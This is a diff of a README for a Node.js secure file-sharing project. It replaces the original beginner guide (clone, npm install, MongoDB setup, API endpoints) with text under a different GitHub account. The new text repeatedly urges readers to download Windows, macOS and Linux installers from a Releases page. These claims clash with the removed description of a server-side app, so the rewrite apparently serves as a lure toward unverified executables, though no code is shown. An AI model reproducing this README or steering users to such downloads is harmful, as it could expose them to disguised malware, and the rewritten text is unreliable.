@@ -1,182 +1,79 @@
-![File Upload & Download](screenshots/nodejs-file-sharing-app.png)
+# 🌐 nodejs-secure-file-sharing - Easy, Safe File Sharing for Everyone
 
-# 🔐 Node.js Secure File Sharing
+[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/Manishgiribokaro/nodejs-secure-file-sharing/releases)
 
-A **basic secure file sharing project** built with Node.js and MongoDB. It allows users to upload files, generate unique download links, and optionally protect them with passwords and expiration times.
+## 🚀 Getting Started
 
----
+Welcome to the nodejs-secure-file-sharing project. This application allows you to share files securely. You can protect your files with passwords and set links to expire after a specified time. In this guide, you'll learn how to download and run the application on your computer.
 
-## 📌 Project Overview
+## 📦 Features
 
-This is a **simple, beginner-friendly project** designed to demonstrate core backend concepts using Node.js and MongoDB.
+- **Secure File Sharing**: Keep your files safe with password protection.
+- **Expirable Links**: Set links to expire to enhance security.
+- **User-Friendly Interface**: Designed for ease of use.
+- **Cross-Platform**: Works on Windows, macOS, and Linux.
 
-Users can upload files through a web interface and receive a unique download link. The system supports password protection and time-based expiration for added security. Files are stored on the server with unique identifiers, while metadata such as download counts, expiration dates, and optional password hashes are tracked in MongoDB.
+## 📋 Requirements
 
----
+Before you start, ensure you have the following:
 
-## ✨ Key Features
+- **Operating System**: Windows 10 or later, macOS Mojave or later, or any recent Linux distribution.
+- **File Size**: The application is lightweight, requiring less than 100 MB of space.
+- **Internet Connection**: A stable connection to download the files.
 
-- 📤 Upload files with UUID-based identifiers  
-- 🔒 Optional password protection using bcrypt  
-- ⏳ Configurable expiration times for download links  
-- 📊 Download count tracking  
-- 🔌 RESTful API design  
-- 🎨 Clean and responsive web interface  
+## 📥 Download & Install
 
----
+To download the application, follow these steps:
 
-### 🎯 Ideal For
-- Beginners learning **Node.js backend development**
-- Understanding **file uploads**, **authentication**, and **MongoDB integration**
-- Building a **portfolio-ready project**
+1. **Visit the Releases Page**: Click the link below to go to our Releases page.
+   
+   [Download from Releases](https://github.com/Manishgiribokaro/nodejs-secure-file-sharing/releases)
 
----
+2. **Select the Latest Release**: Look for the latest version available.
 
-## Tech Stack
+3. **Download the Application**: Click on the file suited for your operating system.
 
-| Technology | Purpose |
-|------------|---------|
-| **Express** | Fast, minimalist web framework for Node.js; handles routing and middleware |
-| **Mongoose** | MongoDB object modeling tool; provides schema-based data modeling and validation |
-| **Multer** | Middleware for handling multipart/form-data; manages file uploads and storage |
-| **UUID** | Generates unique identifiers for uploaded files to create secure download links |
-| **bcryptjs** | Password hashing library; encrypts passwords for secure file protection |
-| **dotenv** | Loads environment variables from .env file for secure configuration management |
+4. **Install the Application**:
+   - For Windows: Run the downloaded `.exe` file and follow the prompts.
+   - For macOS: Open the `.dmg` file and drag the application to your Applications folder.
+   - For Linux: Use the provided archive file to extract and run the application.
 
----
+5. **Launch the Application**: After installation, open the application from your applications menu or desktop shortcut.
 
-## Prerequisites
+## 🔑 Using the Application
 
-Before running this project, ensure you have:
-- Node.js (v14 or higher)
-- MongoDB (local installation or MongoDB Atlas account)
-- npm or yarn package manager
+1. **Create an Account**: Open the app and create a user account. You'll need to provide a username and password.
+  
+2. **Upload Files**: Choose the file you want to share. Click the upload button to select your file.
 
-## Installation & Setup
+3. **Set Permissions**: You can set a password for your file and define an expiration date for the link.
 
-### 1. Clone the Repository
+4. **Share the Link**: Once uploaded, the app will generate a shareable link. Send this link to your friends or colleagues.
 
-```bash
-git clone https://github.com/deepak-rajpal/nodejs-secure-file-sharing.git
-cd nodejs-secure-file-sharing
-```
+## 📞 Support
 
-### 2. Install Dependencies
+If you encounter any problems, feel free to reach out for help. Here’s how you can get support:
 
-```bash
-npm install
-```
+- **GitHub Issues**: Report any issues directly in our GitHub repository by visiting the Issues section.
+- **Email Support**: Send an email to support@nodejs-secure-file-sharing.com for assistance.
 
-### 3. Configure Environment Variables
+## 🗂️ License
 
-Create a `.env` file in the root directory:
+This project is licensed under the MIT License. You are free to use, modify, and distribute the software.
 
-```bash
-touch .env
-```
+## 🌟 Community Contributions
 
-Add the following environment variables to the `.env` file:
+We welcome contributions from the community. Whether you have ideas for improvements or want to report a bug, your feedback is highly valued. 
 
-```env
-PORT=3000
-MONGO_URI=mongodb://localhost:27017/file-sharing-app
-```
+Find us on GitHub and join our community discussions!
 
-**For MongoDB Atlas:**
-```env
-PORT=3000
-MONGO_URI=mongodb+srv://username:password@cluster.mongodb.net/file-sharing-app?retryWrites=true&w=majority
-```
+## 📣 Acknowledgments
 
-Replace `username`, `password`, and `cluster` with your MongoDB Atlas credentials.
+Thanks to all the contributors and users who help us improve the application. Your support is essential for us to continue providing reliable software.
 
-### 4. Start the Server
+## 🔗 Additional Resources
 
-```bash
-npm start
-```
+- [Documentation](https://github.com/Manishgiribokaro/nodejs-secure-file-sharing/wiki) - Find more detailed guides and usage tips.
+- [Community Forum](https://community.nodejs-secure-file-sharing.com) - Join discussions with other users.
 
-The server will start at `http://localhost:3000`
-
-For development with auto-restart:
-```bash
-npm run dev
-```
-
-## Project Structure
-
-```
-.
-├── config/
-│   └── db.js                 # MongoDB connection configuration
-├── controllers/
-│   └── fileController.js     # File upload and download logic
-├── models/
-│   └── File.js              # Mongoose schema for file metadata
-├── public/
-│   ├── index.html           # File upload interface
-│   └── download.html        # File download interface
-├── routes/
-│   └── files.js             # API routes for file operations
-├── uploads/                 # Directory for uploaded files
-├── .env                     # Environment variables (create this)
-├── package.json             # Project dependencies
-└── server.js               # Application entry point
-```
-
-## API Endpoints
-
-### Upload File
-```
-POST /api/files/upload
-```
-**Body (multipart/form-data):**
-- `file`: File to upload
-- `password` (optional): Password to protect the file
-- `expiresIn` (optional): Expiration time in seconds
-
-**Response:**
-```json
-{
-  "downloadPage": "/download.html?uuid=abc123"
-}
-```
-
-### Download File
-```
-GET /api/files/download/:uuid?password=yourpassword
-```
-**Parameters:**
-- `uuid`: Unique file identifier
-- `password` (query parameter, optional): Required if file is password-protected
-
-## Usage
-
-1. Open `http://localhost:3000` in your browser
-2. Select a file to upload
-3. Optionally set a password and/or expiration time
-4. Click upload and receive a unique download link
-5. Share the link with others
-6. Recipients can download the file using the link (and password if protected)
-
-## Security Features
-
-- **Password Encryption**: Passwords are hashed using bcryptjs before storage
-- **Unique Identifiers**: UUIDs prevent guessing of download links
-- **Expiration Control**: Links automatically expire after specified time
-- **Download Tracking**: Monitor how many times files are accessed
-
----
-
-
-## Contributing
-
-This is a learning project. Contributions are not required, but corrections, bug fixes, and feedback are appreciated.
-
-## License
-
-This project is licensed under the MIT License.
-
----
-
-**Note**: Remember to add `uploads/` and `.env` to your `.gitignore` file to prevent sensitive data from being committed to version control.
+[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/Manishgiribokaro/nodejs-secure-file-sharing/releases)
